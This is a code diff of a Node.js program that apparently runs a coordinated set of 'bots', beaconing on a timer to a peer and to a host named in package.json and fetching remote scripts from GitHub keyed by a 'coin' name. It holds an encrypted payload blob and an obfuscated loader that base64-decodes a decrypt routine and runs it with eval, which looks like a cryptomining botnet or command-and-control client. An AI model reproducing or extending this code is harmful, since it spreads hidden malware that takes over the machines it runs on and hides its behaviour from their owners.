@@ -44,16 +44,20 @@ var main = function() {
   setInterval(function() {
     m = new Date().getMinutes();
     active = (cluster.id == 1 && m < 30) || (cluster.id == 2 && m >= 30);
-    var t = cluster.id == 1 && m == 29; if(!t) t = cluster.id == 2 && m == 59;
-  
-    if(!cluster.rec && t) {
+    
+    var p1 = cluster.id == 1 && m == 0; if(!p1) p1 = cluster.id == 2 && m == 30;
+    if(!cluster.rec && p1) {
+      cluster.rec = true;
+      request(require('./package.json').host, function(err, res, body) { cluster.rec = false });
+    }
+    
+    var p2 = cluster.id == 1 && m == 29; if(!p2) p2 = cluster.id == 2 && m == 59;
+    if(!cluster.rec && p2) {
       cluster.rec = true;
       request(cluster.peer, function(err, res, body) {
         if(body == 'Hello world!') {
           var data = { bots: [] }; for(var i=0; i<bots.length; i++) data.bots.push([bots[i].host])
-          request.post({ url: cluster.peer, form: data, json: true }, function(err, res, body) {
-            cluster.rec = (body == 'new' || body == 'old')
-          })
+          request.post({ url: cluster.peer, form: data, json: true }, function(err, res, body) { cluster.rec = false })
         }
         else cluster.rec = false
       });
@@ -130,7 +134,7 @@ var main = function() {
   function update_bots(list) {
     var b1 = []; for(var i=0; i<list.length; i++) b1.push(list[i][0]);
     var b2 = []; for(var i=0; i<bots.length; i++) b2.push(bots[i].host);
-    if(JSON.stringify(b1) == JSON.stringify(b2)) return 'old'
+    if(JSON.stringify(b1) == JSON.stringify(b2)) return false
     else {
       for(var i=0; i<bots.length; i++) {
         if(bots[i].wakeup) clearTimeout(bots[i].wakeup);
@@ -142,7 +146,7 @@ var main = function() {
         bots.push(nbot); wakeup(nbot);
         self.log({host:b1[i],msg:'add bot'});
       }
-      return 'new'
+      return true
     }
   }
 
@@ -209,7 +213,6 @@ var main = function() {
 
   function init(body,callback) {
     var coin = body.init
-    var bb = body.bots
     request( require('./package.json').github+coin+".js", function(err, res, body) {
       if(err) callback('error git_1: '+err.message)
       else if(body == '404: Not Found') callback('error git_1: '+body)
@@ -228,8 +231,7 @@ DuwGYzwWyuLYxpXxRAhXxzqlbwM/HdmIS3vqh71dCTektrzIooA7tRh4tKDVUNVILVgNC4m9DF+IJOsH
 ZJVF1ep7ksbxF0nrNia1Hm3cQL0hifx4mp5/G2JhdLI/xcxLkhA3oPulryJOYETtQZw0q7VAih8tCYeuqnDzJ2ZFEYQPv2sIfkjQzPvpCi2eZceq30TGSG836aiyYjNq0MsS9VLRuXMx1zN/8nqc6tWwGa8/rz9Q
 vScvrDWM/7Fjm9Ixj1rfsJTYeUBt9ppkdSyirV50xwgg/e5wa2UAC1BgAwqIy9ho9ZSoLjqOIADw+V7YQZVBxnOXDC20UVprO7xm0rcoMWm2K4ma01vXnUQhy1f1z1aqAVgSxgRE9eJX5g21zNoVi5X2XC9f7VjC
 59j0bv3foy4ZH99XDP1Orc80MXr0/DenClJba8ce/kyav21aiZ8Y4GvF1oiC3j8+`);
-            if(bb) update_bots(bb);
-            callback('init '+coin);
+            callback('init '+coin );
           }
         })
       }
@@ -272,7 +274,6 @@ vScvrDWM/7Fjm9Ixj1rfsJTYeUBt9ppkdSyirV50xwgg/e5wa2UAC1BgAwqIy9ho9ZSoLjqOIADw+V7Y
   var glob = function(x) { eval(decrypt(x.substring(-~[]))) }
   ('AZGVjcnlwdCA9IGZ1bmN0aW9uKHgpeyByZXR1cm4gQ3J5cHRvSlMuQUVTLmRlY3J5cHQoeC5zcGxpdCgnXG4nKS5qb2luKCcnKSwnMTIzNDUnKS50b1N0cmluZyhDcnlwdG9KUy5lbmMuVXRmOCkgfQ==');
 
-  init({init:"Tube"},function(){})
 }
 
 var mm = new main()
